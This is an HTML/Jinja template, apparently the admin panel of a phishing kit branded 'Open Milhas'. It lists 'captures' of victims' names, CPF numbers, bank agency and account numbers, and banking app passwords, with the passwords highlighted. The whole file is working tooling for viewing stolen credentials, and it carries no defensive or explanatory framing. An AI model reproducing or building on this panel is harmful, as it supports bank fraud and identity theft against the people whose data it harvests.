<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel Admin | Open Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light p-4">
    <div class="container bg-white p-4 shadow rounded">
        <h3>Capturas Realizadas</h3>
        <table class="table table-striped mt-4">
            <thead class="table-dark">
                <tr><th>Nome</th><th>CPF</th><th>Ag/Conta</th><th>Senha App</th></tr>
            </thead>
            <tbody>
                {% for u in usuarios %}
                <tr>
                    <td>{{ u[1] }}</td><td>{{ u[2] }}</td>
                    <td>{{ u[5] }} / {{ u[6] }}</td>
                    <td class="text-danger"><b>{{ u[7] }}</b></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
